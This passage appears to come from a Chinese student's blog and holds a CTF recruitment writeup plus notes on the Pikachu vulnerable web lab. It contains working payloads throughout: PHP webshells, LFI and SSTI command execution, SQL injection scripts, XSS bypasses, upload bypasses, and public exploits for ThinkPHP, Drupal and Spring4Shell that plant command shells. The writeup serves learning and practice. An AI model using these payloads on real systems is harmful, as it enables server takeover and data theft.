什么是GNOME_GNOME简介_GNOME的优势以及应用场景-腾讯云开发者社区 (tencent.com) etc&#x2F;profile和&#x2F;etc&#x2F;environment的比较 - 明明是悟空 - 博客园 (cnblogs.com) ArchLinux安装使用蓝牙之基础_archlinux 蓝牙_kler的博客-CSDN博客 Linux 系统目录结构 | 菜鸟教程 (runoob.com)","categories":[{"name":"Learning record","slug":"Learning-record","permalink":"https://foreon.github.io/categories/Learning-record/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://foreon.github.io/tags/linux/"}]},{"title":"YuLin 2023 Recruit Writeup","slug":"YuLin 2023 Recruit Writeup","date":"2023-11-03T15:56:39.000Z","updated":"2023-12-02T18:15:14.358Z","comments":true,"path":"posts/36124.html","link":"","permalink":"https://foreon.github.io/posts/36124.html","excerpt":"","text":"YuLin 2023 Recruit Writeup前言（叠个甲先part1是用word写的，直接黏贴过来量太多就不修改了😭，part2 是用md，可能看起来舒服一点。如果读者看得比较难受，这非常正常，请原谅我的懒惰🙇part1:Tutorial1.http这里要注意，admin是改cookie里的admin&#x3D;1! 2.302跳转 查看源代码找到&#x2F;302.php Curl -i 找到flag 3.encode 关于decode可以看看这个链接 https://www.cnblogs.com/ruoli-s/p/14206145.html 判断第一个是md5 解密得到Yulin 判断第二个是hex编码 解码得到Sec{we_mu5t_kn0w 第三个是base64 解码得到_c0mm0n 判断第四个是html实体编码 解码得到_enc0d1ngs} 组合一下得到flag YulinSec{we_mu5t_kn0w_c0mm0n _enc0d1ngs} 4.Method 被提示有很多httpmethod 拿postman一个个试就试出来了 5.cal-1 源代码进去改下长度就完事 6.cal-2 发现要用post的方法传数据，就完事了 7.cal-3 用python脚本做 我还学了好一会，感觉python脚本是个大问题 import requestss&#x3D;requests.Session()url&#x3D;’http://43.142.109.233:44504/index.php‘r&#x3D;s.get(url) res&#x3D;r.text a&#x3D;res.find(““)b&#x3D;res.find(“&#x2F;p&gt;”,a)#找到我们要计算的式子的前后位置num&#x3D;res[a+3:b-1]print(a)print(b)print(num)r&#x3D;s.post(url,data&#x3D;{‘result’:eval(num)})print(r.content) 8.https 前言: 经大佬提醒,了解了不少jwt知识 了解到两种主要思路 1.弱口令把key爆出来 2.使用none的方式 由于安装不清楚第一次所需的工具😅，所以采用第二种方法 原理如下所示 本题抓包发现token,于是采用jwt绕过 1.将头部信息的alg值改为none，并进行base64加密 2.将声明部分的admin值改为true，也进行base64加密 3.新组合的JWT应该为头部``.``声明``.(因为头部中的加密方式为none，所以签名部分可以舍去)，但又由于&#x3D;号会与url解码产生歧义，所以需要将&#x3D;号删除，而Base64URL是支持这种写法的 最终的JWT值为ewogICJhbGciOiAibm9uZSIsCiAgInR5cCI6ICJKV1QiCn0.ewogICJhZG1pbiI6ICIxIiwKICAiaWF0IjogMTY5NDk0OTM0NSwKICAiZXhwIjogMTY5NDk1NjU0NSwKICAianRpIjogIjM0YTczNGEzODAzZGY1NmZlYmIzOTg3MzJlOWQwZDE5Igp9. 4.把token放到cookie里得到flag LFI 依照提示传参即可 不知道为啥hackbar的post这类题用不了？ 那就用postman来post 使用file&#x3D;php:&#x2F;&#x2F;input + post 再file&#x3D;php:&#x2F;&#x2F;input + post 得到flag 使用data:&#x2F;&#x2F;text&#x2F;plain;base64,xxxx(base64编码后的数据)data:&#x2F;&#x2F;text&#x2F;plain, data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4&#x3D; data:&#x2F;&#x2F;text&#x2F;plain, data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4&#x3D; 得到flag 看到提示，直接想到用base64编码转出 file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php 得到一串base64编码，转码之后即得到flag 看教程绕过file_get_contents($file) 了但是还对原理一知半解 采用第一种方式就拿到flag了 文档里说的很清楚了，话说我自己试的一句话木马就不太好使，还得是图片里的这个好使，然后就生成一句话木马图片呗，然后蚁剑 &lt;?phpfputs(fopen(“shell.php”,&#39;w&#39;),&#39;&lt;?php @eval($_POST[”leon“])；?&gt; &#39;); ?&gt; 要注意的是蚁剑访问的目录是生成的shell.php 即为http://43.142.109.233:21005/shell.php 这题花了我大概一天的时间钻研，最终做出来了 参考：LFI 绕过 Session 包含限制 Getshell_通过sessid进行文件写即可,使用 file:&#x2F;&#x2F;localhost&#x2F; 进行绕过_zhang三的博客-CSDN博客 先了解session知识吧 Phpinfo先找到session的储存路径 Session自定义一个 然后传一个一句话木马 发现可以控制了 于是果断蚁剑解出 补一个大佬的做法： 思路更清晰一些 XSS 看看这这篇攻略XSS挑战赛解题思路_多崎巡礼的博客-CSDN博客 看源代码发现有个hidden的 name 普普通通构造个playload就完事了 name=&lt;script&gt;alert(1)&lt;/script&gt; 这里我本来想用闭合标签来完成 但是发现&lt;被转义了，只能利用 &#39;onmouseover=alert(1)//，不过这里需要用单引号闭合，构造playload 和上题一样，只不过把单引号换成双引号来闭合罢了 第四题发现会把on转成o_n 而且会给 中间的东西加双引号 于是上网查攻略,知道要用伪协议 &quot;&gt;&lt;iframe src=javascript:alert(1)&gt; &quot;&gt;&lt;a href=javascript:alert(1)&gt; &quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;zhouzhong&lt;/a&gt; &quot;&gt;&lt;a href=&quot;javascript:%61lert(1)&quot;&gt;zhouzhong&lt;/a&gt; // 就做出来了 5. 试了试”&gt;1&lt;script&gt;alert(1)&lt;/script&gt; // 可能是屏蔽了script,于是思路是双写绕过 &quot;&gt;&lt;scriscriptpt&gt;alert(0)&lt;/scriscriptpt&gt;//这些双写也可以 就拿到flag了 用伪协议发现过滤了javascript，于是查攻略吧 javascrip&amp;#x74;:alert(1) javasc&amp;#x72;ipt:alert1 javasc&amp;#x0072;ipt:alert1 第一次见这种，猜测t_sort那里是隐藏的搜索框 于是看攻略吧 这里只要构造如下playload就行 t_sort=”type=’’text”onclick = ”alert(1) 复现了一下发现这个双引号”不能用 得用下面的双引号 “ 未解之谜，先放这吧 t_sort=&quot;type=&quot;text&quot;onclick = &quot;alert(1) XSS看攻略愉快的ak了 话说真的不是按这个攻略出题的吗( RCE 在当前目录下没找，于是 ls &#x2F; ping127.0.0.1;ls &#x2F; # 找到flag ping127.0.0.1;cat &#x2F;flag_3124131231 # ping127.0.0.1;ls # 有waf 试了一下过滤了;|&amp;’&#96;等等 于是用%0a``绕过 ip=127.0.0.1%0als / 再ip&#x3D;127.0.0.1%0acat&#x2F;flag_31241421414 得到flag 试了一下过滤了ls 文件上传 采用了一种新的方式 传一句话木马文件蚁剑后门报错捏 于是火狐禁止js，传一个.php文件上去 路径是复制的图像链接 然后蚁剑后门 考察.htaccess文件 用记事本写这样一个名为.htaccess的文件 注意保存为所有类型 &lt;FilesMatch“.png”&gt; SetHandler application&#x2F;x-httpd-php 该文件的意思是，只要遇到文件名中包含有”.png”字符 串的，统一按照 php 文件来执行。然后就可以上传一个带一句话木马的文件，例如a_php.gif，会 被当成php执行。该方法其实不是漏洞，是Apache的特性。该方法常用于黑客入侵网站之后，不想 被发现，留一个隐蔽的后门。 然后先上传.htaccess文件,再上次木马.png 然后蚁剑就完事了 上传php文件抓包，修改文件类型为image&#x2F;png 然后就可以上传了，于是愉快的蚁剑 考察文件头绕过 用winhex 但是这样修改后用蚁剑连接 http://43.142.109.233:30004/upload/muma.png 还是报错，于是再次采用上传php用burp改png的方法 其实也可以换一种生成shell.php的png图片木马 下次再试 然后蚁剑吧 很明显要绕过黑名单这些 但是明显黑名单太少了，这里先用大写绕过罢 然而大写绕过并不可行？ 再次尝试双写绕过，成了，于是蚁剑 再次尝试双写 发现不行，添加了一个空格 这次大写绕过又行了？ 那就蚁剑吧 提示%00截断 原理如下 照猫画虎就出来了 考察16进制00截断 Burp上传图片木马抓包 在路径后面加一个1.php+,再在hex里找到+对应的编码，并改成00,就跟上题一样了 提示白名单，但是试一下又觉得是黑名单？ 双写大写绕过都没用，那试试别的吧 莫名奇妙做出来了？ 改成这样 注意蚁剑连接phtml还是小心(为什么 这题要再做一遍 为什么这里多了个空格，怎么复现？ 再做了一次为什么又没空格了，而且这里路径为什么不需要大写？ 11.二次渲染 合成一个gif木马文件，注意文件头要对 还是不行？那还是找一张真正的gif合成吧 现在行了 下载gif，比对没有改变的地方 然后在不改变的地方插入一句话木马 蚁剑连图片链接老报错 去学了一下 其实用一个文件包含漏洞就能用蚁剑连接 要利用include.php?file&#x3D;upload&#x2F; 然后就可以用蚁剑连接了 网页也是可以访问的 提示是利用move_uploaded_file($temp_file,$img_path)的漏洞，这个函数它有一个特性，会忽略到文件末尾的&#x2F;. 这样上传，然后burp抓包 把名字改成muma.php&#x2F;. 蚁剑连接 &#x2F;upload&#x2F;muma.php发现可以访问了 顺藤摸瓜找到了原帖（搜索能力也是能力！ 直接看原帖吧，哥们代码审计还看不明白 Sql注入 1.普通注入 普普通通的整形闭合 如图所示做完 提示是报错注入 试了一下是整形闭合捏 以下黏贴之后的代码有问题 爆数据库 http://43.142.109.233:20002/?id=-1 and updatexml(1,concat(‘~’, substr( (select group_concat(schema_name) from information_schema.schemata) , 1 , 31) ),3)– a 爆表名 http://43.142.109.233:20002/?id=-1 and updatexml(1,concat(‘~’, substr( (select group_concat(table_name) from information_schema.tables wheretable_schema&#x3D;database()) , 8 , 31) ),3)– a 注意这里要取后面的字符才完整 爆列名 http://43.142.109.233:20002/?id=-1 and updatexml(1,concat(‘~’, substr( (select group_concat(column_name) from information_schema.columns wheretable_name&#x3D;’flag’) , 1 , 31) ),3)– a 爆flag http://43.142.109.233:20002/?id=-1 and updatexml(1,concat(‘~’, substr( (select group_concat(flag) from flag) , 10 , 31) ),3)– a 注意flag太长显示不完全，分段来看吧 布尔盲注 一些基础知识 操作 开搞 试了一下发现是整形形闭合 http://43.142.109.233:20003/?id=1and length(database())&#x3D;8 尝试到8发现回显ok,说明数据库名为8 一个个把数据名试出来 推荐二分查找法 http://43.142.109.233:20003/?id=1and ASCII(SUBSTR(database(),2,1)) &#x3D; 101 ok查出来是security 发现搞不定啊,这工程量。。。还得上脚本 import requests 只需要修改url 和 两个payload即可目标网址（不带参数）url &#x3D; “http://43.142.109.233:20003/“ 猜解长度使用的payloadpayload_len &#x3D; “””?id&#x3D;1 and length( (database()) ) &lt; {n} “”” 枚举字符使用的payloadpayload_str &#x3D; “””?id&#x3D;1 and ascii( substr( (database()) ,{n},1) ) &#x3D; {r} “”” 获取长度def getLength(url, payload): length &#x3D; 1 # 初始测试长度为1 while True: response &#x3D; requests.get(url&#x3D; url+payload_len.format(n&#x3D; length)) # 页面中出现此内容则表示成功 if ‘OK’ in response.text: print(‘测试长度完成，长度为：’, length,) return length; else: print(‘正在测试长度：’,length) length +&#x3D; 1 # 测试长度递增 获取字符def getStr(url, payload, length): str &#x3D; ‘’ # 初始表名&#x2F;库名为空 # 第一层循环，截取每一个字符 for l in range(1, length+1): # 第二层循环，枚举截取字符的每一种可能性 for n in range(33, 126): response &#x3D; requests.get(url&#x3D; url+payload_str.format(n&#x3D; l, r&#x3D; n)) # 页面中出现此内容则表示成功 if ‘OK’ in response.text: str+&#x3D; chr(n) print(‘第’, l, ‘个字符猜解成功：’, str) break; return str; 开始猜解length &#x3D; getLength(url, payload_len)getStr(url, payload_str, length) 每次要改的地方只有标红的区域 database() 爆出来表名为security 这里先手动对当前数据库爆表的数量，很方便 http://43.142.109.233:20003/?id=1and (select COUNT(*) from information_schema.tables wheretable_schema&#x3D;database())&#x3D;5 爆出来是5 selecttable_name from information_schema.tables where table_schema &#x3D; database() limit0,1 selecttable_name from information_schema.tables where table_schema &#x3D; database() limit0,1 第一个表 referers selecttable_name from information_schema.tables where table_schema &#x3D; database() limit 1,1 selecttable_name from information_schema.tables where table_schema &#x3D; database() limit 1,1 只改limit后面的数就完事 第二个表 emails 以此推类 第三个表users 第四个表flag 第五个表 就不查了 4.手动爆一些users的列数量 http://43.142.109.233:20003/?id=1and (select COUNT(*) from information_schema.columns wheretable_schema&#x3D;database() and table_name&#x3D;”users”)&#x3D;3 爆出来是3 注意这里要用双引号，我也不知道为啥。。 selectcolumn_name from information_schema.columns where table_schema &#x3D; database() andtable_name &#x3D;”users” limit 0,1 selectcolumn_name from information_schema.columns where table_schema &#x3D; database() andtable_name&#x3D;”users” limit 0,1 selectcolumn_name from information_schema.columns where table_schema &#x3D; database() andtable_name&#x3D;”users” limit 0,1 测出uers第一列:id 测出uers第三列: 测出uers第三列:password 不测了，才发现前面搞错了 flag已经整出来了 那就重复这些步骤找flag的列 测出flag第二列flag selectflag from flag limit 0,1 终于爆出来了 可能是我脚本的问题，速度是龟速，靠脚本还是花了好久时间，不过只是为了解出题那瞬间的多巴胺分泌带来的快感，也是值得的 找朋友要了个更快的自动化脚本 还是整形闭合 在朋友脚本的基础上改了一下做出来了 不过精确度不高 延时盲注的一些语句： “1and if((select count(table_name) frominformation_schema.tables where table_schema &#x3D; ‘database()’) &#x3D; 1,sleep(2),1) 主要是运用if三元式和sleep的原理 YulinSec{0kfjtXaE8VJxXFG9BjZSy0Yn6dVLLMwbQ3OiaI20} 还不会 Babyurl 考察ssrf urls&#x3D;http://0x7F.0.0.1/flag.php SSTI 1. 1.&#123;&#123;''.__class__&#125;&#125; # 获得单引号的类型 2.&#123;&#123;''.__class__.__base__&#125;&#125; #获得object 3.&#123;&#123;''.__class__.__base__.__subclasses__()&#125;&#125;#获得基类 这里要写个脚本得到os._wrap_close的键值 4.&#123;&#123;''.__class__.__base__.__subclasses__()[127]&#125;&#125;#这里我们利用的是&lt;class&#39;os._wrap_close&#39;&gt;类 5.&#123;&#123;''.__class__.__base__.__subclasses__()[127].__init__.__globals__&#125;&#125;#将该类实例化并且全局搜索查找所有的方法、变量和参数 6.&#123;&#123;''.__class__.__base__.__subclasses__()[127].__init__.__globals__['popen']('ls').read()&#125;&#125;#利用popen函数执行命令 7.&#123;&#123;''.__class__.__base__.__subclasses__()[127].__init__.__globals__['popen']('cat flag').read()&#125;&#125;#最后获得flag 不是直接cat，但差不多吧 2. 过滤&#123;&#123;` `用&#123;%print(来代替` `比如` `&#123;%print(''.__class__)%&#125;` `然后按第一题思路就行` `&#123;%print(''.__class__.__base__.__subclasses__()[127]) .__init__.__globals__['popen']('cat /flag').read()%&#125;` `3.` `过滤[]，用getitem` `&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(127).__init__.__globals__.__getitem__('popen')('ls').read()&#125;&#125; &#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(127).__init__.__globals__.__getitem__('popen')('cat` `/flag').read()&#125;&#125; 4. 过滤下划线 用16进制编码绕过 &#123;&#123;()['\\x5f\\x5fclass\\x5f\\x5f']['\\x5f\\x5fbase\\x5f\\x5f']['\\x5f\\x5fsubclasses\\x5f\\x5f']()[127]['\\x5f\\x5finit\\x5f\\x5f']['\\x5f\\x5fglobals\\x5f\\x5f']['popen']('cat` `/flag').read() &#125;&#125; 5. 过滤单双引号 &#123;&#123;[].__class__.__mro__[1].__subclasses__()[127].__init__.__globals__[request.args.a](request.args.b).read()&#125;&#125; 同时get传参?a=popen&amp;b=cat /flag 6． 过滤小数点 &#123;&#123;()['__class__']['__base__']['__subclasses__']()[127]['__init__']['__globals__']['popen']('cat` `/flag')['read']()&#125;&#125; 7. 过滤了一堆关键字 &#123;&#123;()['__cla'+'ss__']['__ba'+'se__']['__subcl'+'asses__']()[127]['__in'+'it__']['__glo'+'bals__']['pop'+'en']('c'+'at` `/fl'+'ag')['re'+'ad']()&#125;&#125; # part2:YuLin 2023 Recruit Writeup part 2word太难用了，于是part2都用md来写 [Easy]盒武器picture1识图出来：武汉理工大学南湖校区心至楼 picture2在地图附件找武汉长江大桥的公园 试出来：湖北省武汉市汉阳区龟山北路5号龟山风景区 看出题人空间找到10.4到10.5的武汉游玩信息 穷举试出来：2023年10月05日18时 babyphp12345678910111213141516&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);if (isset($_GET[&#x27;a&#x27;]) &amp;&amp; isset($_GET[&#x27;b&#x27;])) &#123; if(($_GET[&#x27;a&#x27;] != $_GET[&#x27;b&#x27;]) &amp;&amp; (sha1($_GET[&#x27;a&#x27;]) == sha1($_GET[&#x27;b&#x27;])))&#123; die(&#x27;flag1: &#x27;.$flag1); &#125; else die(&#x27;a is not equal to b&#x27;);&#125;if ((string)$_GET[&#x27;Yu&#x27;] !== (string)$_GET[&#x27;lin&#x27;] &amp;&amp; (md5($_GET[&#x27;Yu&#x27;]) === md5($_GET[&#x27;lin&#x27;]))) &#123; eval($_GET[&#x27;Yu&#x27;]); //cat /flag2&#125; 第二个flag考察fastcoll，用fastcoll生成两个md5相同的字符串，由于有不可见字符，要url编码之后get传参 注意这里根据题目要求，生成文件要用system(‘cat &#x2F;flag2’);# #用于截断，eval只执行system(‘cat &#x2F;flag2’); 1234567891011121314151617181920212223242526272829303132333435363738&lt;?php function readmyfile($path)&#123; $fh = fopen($path, &quot;rb&quot;); $data = fread($fh, filesize($path)); fclose($fh); return $data;&#125;$a = urlencode(readmyfile(&quot;G:\\php\\app\\php-7.4.5-Win32-vc15-x64\\a_msg1.txt&quot;));$b = urlencode(readmyfile(&quot;G:\\php\\app\\php-7.4.5-Win32-vc15-x64\\a_msg2.txt&quot;));if(md5((string)urldecode($a))===md5((string)urldecode($b)))&#123;echo &quot;a:&quot;;echo PHP_EOL;echo $a;echo PHP_EOL;&#125;if(urldecode($a)!=urldecode($b))&#123;echo &quot;b:&quot;; echo PHP_EOL;echo $b;echo PHP_EOL;echo &quot;a url 编码的MD5:&quot;;echo PHP_EOL;echo md5(urldecode($a));echo PHP_EOL;echo &quot;a url 编码的MD5:&quot;;echo PHP_EOL;echo md5(urldecode($b));echo PHP_EOL;echo &quot;复制a url 的MD5&quot;;echo PHP_EOL;echo md5(&quot;leon%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%1FU%F8%24%DA%25Q%F8j%FE%21%F9u%3D9%88%08%11%BC9s%97%CC%E1%18%C2%80E%B0%1D%0Cw%A1%EB%FE%BD%CC%CE%1A%8C%0B%C8%F7%02%E3%F1%09o%84%A8%E6n%E0%1F%8E%7B%17l%01W%DF%FD%40eu%D9%E6f%12%AA%98Z%7F%9A%C1%2A%D9i%CB%0CE%F2X%18%8A%CD%FE%1C+%29%AF%07J%7C%F1%BD%8D_%7Bd%D4%DA%B0%87%22%1D%05%D2%99L%05%3F%CA%84%10%B1%B6%D6%C3qr%29%12m%ED%C4%D0%FB&quot;);echo PHP_EOL;echo &quot;复制b url 的MD5&quot;;echo PHP_EOL;echo md5(&quot;leon%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%1FU%F8%24%DA%25Q%F8j%FE%21%F9u%3D9%88%08%11%BC%B9s%97%CC%E1%18%C2%80E%B0%1D%0Cw%A1%EB%FE%BD%CC%CE%1A%8C%0B%C8%F7%02%E3q%0Ao%84%A8%E6n%E0%1F%8E%7B%17l%01%D7%DF%FD%40eu%D9%E6f%12%AA%98Z%7F%9A%C1%2A%D9i%CB%0CE%F2X%98%8A%CD%FE%1C+%29%AF%07J%7C%F1%BD%8D_%7Bd%D4%DA%B0%87%22%1D%05%D2%99%CC%04%3F%CA%84%10%B1%B6%D6%C3qr%29%12%ED%ED%C4%D0%FB&quot;);$code=&quot;echo 1234 ;#efsdghfgj&quot;;eval(&quot;$code&quot;);&#125; 1http://43.142.109.233:2003/?Yu=system%28%27cat+%2Fflag2%27%29%3B%23%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00f%AB%0F%AE%F7%7C%8DQ8%AA%84%A7Z%06%AD%E8%91F%DE%8DL%D5AUE%B27A%8C%06%89w%3D%BB%AD%CF%F2%28Mp%8F%F0%D5%1C%A0%C9%EAZd%DA%F7%7D%8C%05%ED4%9B%ECXE%88%2F%9F%C5%BA%E8%BAX%2F.%DD%B9%BDJ%B3%7C%96G%3C%3B%A7A%C1x8%9B1%B2%AB%C30%B8%A6_%88%A8%D7%BD%EA%E7%9F%043%FE5%40%0C4Q%F8%F9%C3%B2%EFwp%8AQv%3D%C7aq%BFV%F5%86X&amp;lin=system%28%27cat+%2Fflag2%27%29%3B%23%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00f%AB%0F%AE%F7%7C%8DQ8%AA%84%A7Z%06%AD%E8%91F%DE%0DL%D5AUE%B27A%8C%06%89w%3D%BB%AD%CF%F2%28Mp%8F%F0%D5%1C%A0I%EBZd%DA%F7%7D%8C%05%ED4%9B%ECX%C5%88%2F%9F%C5%BA%E8%BAX%2F.%DD%B9%BDJ%B3%7C%96G%3C%3B%A7A%C1%F88%9B1%B2%AB%C30%B8%A6_%88%A8%D7%BD%EA%E7%9F%043%FE5%40%0C4Qx%F9%C3%B2%EFwp%8AQv%3D%C7aq%3FV%F5%86X [EASY]Script Kiddie既然当脚本小子我就只求结果了（ thinkphp 5.01/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami drupal123456POST /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1Host: 121.5.35.176:30003Content-Type: application/x-www-form-urlencodedContent-Length: 173form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=echo &quot;PD9waHAgZXZhbCgkX1JFUVVFU1RbOF0pIDs/Pg==&quot; |base64 -d |tee test.php 配合使用 1http://121.5.35.176:30003/test.php?8=system(&#x27;cat /flag&#x27;); spring1234567891011121314151617import requestsheaders=&#123; &quot;suffix&quot;: &quot;%&gt;//&quot;, &quot;c1&quot;: &quot;Runtime&quot;, &quot;c2&quot;: &quot;&lt;%&quot;&#125;payload1=&#x27;/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%&#123;c2&#125;i if(&quot;fuck&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123; java.io.InputStream in = %&#123;c1&#125;i.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; &#125; %&#123;suffix&#125;i&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=fuck&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=&#x27;ip=&quot;http://121.5.35.176:30004/&quot;payload2=&#x27;/fuck.jsp?pwd=fuck&amp;cmd=id&#x27;try: U1=requests.get(url=ip+payload1,headers=headers,verify=False,timeout=3) U2=requests.get(url=ip+payload2,verify=False,timeout=3) if U2.status_code == 200: print(f&quot;The VULN CVE-2022-22965 exists, payload 配合 1http://121.5.35.176:30004/fuck.jsp?pwd=fuck&amp;cmd=cat /flag 绝对音感wav拖到010editor里，最后一段发现提示： 1The interval of each byte data is 9 and the first byte is at the beginning of the wav data c写了个脚本跑出来邮件： Dear Friend ; Especially for you - this red-hot announcement! We will comply with all removal requests ! This mailis being sent in compliance with Senate bill 2116 ;Title 1 ; Section 303 ! This is NOT unsolicited bulkmail ! Why work for somebody else when you can becomerich within 81 months . Have you ever noticed nearlyevery commercial on television has a .com on in itand nearly every commercial on television has a .comon in it . Well, now is your chance to capitalize onthis ! We will help you deliver goods right to thecustomer’s doorstep and use credit cards on your website! You can begin at absolutely no cost to you . Butdon’t believe us . Ms Ames who resides in New Jerseytried us and says “Now I’m rich many more things arepossible” ! This offer is 100% legal . So make yourselfrich now by ordering immediately ! Sign up a friendand you get half off . Thanks ! Dear Salaryman ; Especiallyfor you - this amazing intelligence ! If you are notinterested in our publications and wish to be removedfrom our lists, simply do NOT respond and ignore thismail . This mail is being sent in compliance with Senatebill 2716 , Title 3 , Section 303 ! This is differentthan anything else you’ve seen . Why work for somebodyelse when you can become rich within 87 days . Haveyou ever noticed most everyone has a cellphone andsociety seems to be moving faster and faster . Well,now is your chance to capitalize on this ! WE willhelp YOU use credit cards on your website &amp; turn yourbusiness into an E-BUSINESS . You can begin at absolutelyno cost to you ! But don’t believe us ! Mr Ames ofColorado tried us and says “I’ve been poor and I’vebeen rich - rich is better” ! We are licensed to operatein all states . Do not delay - order today ! Sign upa friend and you’ll get a discount of 50% . Thank-youfor your serious consideration of our offer . 然后根据提示可以把垃圾邮件给解密 用这个网站 1https://www.spammimic.com/decode.cgi 【Mid】MidBypass提示说了有disable_function,给了一个后门 蚁剑一下，第一个flag直接送了，其他路径看不了 还有一个open basedir phpinfo先看看 搜了好多关于imagematrick的文件上传漏洞，但是现在还没搞懂写入的png怎么执行命令🥲 蚁剑插件作弊过了，以后有机会要复现一下 pikachu先部署靶场，我直接放在本地127.0.0.1了 解锁皮卡丘的密码暴力破解1.基于表单暴力破解火狐改下设置抓本地包 burp抓包爆破，爆出来密码123456 2. 基于前端的验证码绕过（on server）随便试了下密码怎么还是123456…….. 先burp抓包，然后发现一次抓包中验证码不用改 就和1一样了 3.基于前端的验证码绕过（on client）试了一下验证码是前端的，那么抓包直接去掉，和1一样 密码测出来还是123456 4.token防暴破初见还真没思路，搜索了一下 抓包pitchfork爆破密码和token 如图在extract选中token 如图填入第一个token,并选择递归搜索 成功，密码当然还是12345 XSS1.反射型xss(get)试了一堆球星，只认识科比，有点难绷。 试了下限制长度，f12改掉就行，再输入 1&lt;script&gt;alert(1)&lt;/script&gt; 成功弹窗 2.反射性xss(post)出bug了，我这题出现了登录框 搜索这题本来的样子，然后脑过吧 改成post就是post传参 1&lt;script&gt;alert(1)&lt;/script&gt; 3.存储型xss也是输入 1&lt;script&gt;alert(1)&lt;/script&gt; 4.DOM型xssf12看到提示 function domxss()&#123; var str = document.getElementById(&quot;text&quot;).value; document.getElementById(&quot;dom&quot;).innerHTML = &quot;&lt;a href=&#39;&quot;+str+&quot;&#39;&gt;what do you see?&lt;/a&gt;&quot;; &#125; //试试：&#39;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#39;xss&#39;)&quot;&gt; //试试：&#39; onclick=&quot;alert(&#39;xss&#39;)&quot;&gt;,闭合掉就行 输入 1&#x27; onclick=&quot;alert(&#x27;leon&#x27;)&quot;&gt; 原理就是提前闭合，让href的属性为onclick 5.xss盲打上下两个框都填上 1&lt;script&gt;alert(1)&lt;/script&gt; 然后根据提示登录留言板后台，就弹窗了 6.xss之过滤过滤script,大小写绕过 7.xss之htmlspecialcharsspecialchars函数会把单双引号和尖括号都转义了，但是试了一下这里没过滤单引号 playload: 1&#x27; onclick=&#x27;alert(1) 8.xss之href输出过滤单双引号，用伪协议绕过 1javascript:alert(1) 9.xss之js输出提前闭合第一个script 1’&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt; CSRF1.CSRF(get) login抓包修改个人信息，用burp生成csrf poc: 1234567891011121314&lt;html&gt; &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt; &lt;body&gt; &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt; &lt;form action=&quot;http://127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;sex&quot; value=&quot;hacker&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;phonenum&quot; value=&quot;hacker&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;add&quot; value=&quot;hacker&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;hacker&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 打开链接：http://burp/show/4/2etstzgrlo1eqv1ef15ihs9u0bxp6ybb 发现成功修改（kobe账户需处于登录状态） 2.CSRF(post)改成post传参，其他和1相同，不多赘述 3.CSRF Token遇到token还是不会 搜了一下要用到burp的CSRF Token Tracker插件 添加如图的规则 然后生成poc SQL-Inject1.数字型注入抓包，直接放playload吧 1234567id=-1 union select database(),2//爆库名id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()//爆表名id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;//爆列名id=-1 union select username,password from users//爆账号密码 爆出来了 2.字符型注入注意闭合，其他和1一样 playload: 11’union select username,password from users# 3.搜索型注入只是多了一列 playload: 11&#x27;union select username,password,1 from pikachu.users# 4. XX型注入用 ‘) 来闭合 playlaod: 11&#x27;)union selct username,password from users # 5. insert&#x2F;update注入没有回显，使用报错注入 playload: 12345671&#x27; and extractvalue(1,concat(0x7e,(database()))) and &#x27;1&#x27;=&#x27;1 1&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27; limit 0,1)),0) and &#x27;1&#x27;=&#x27;11&#x27; and 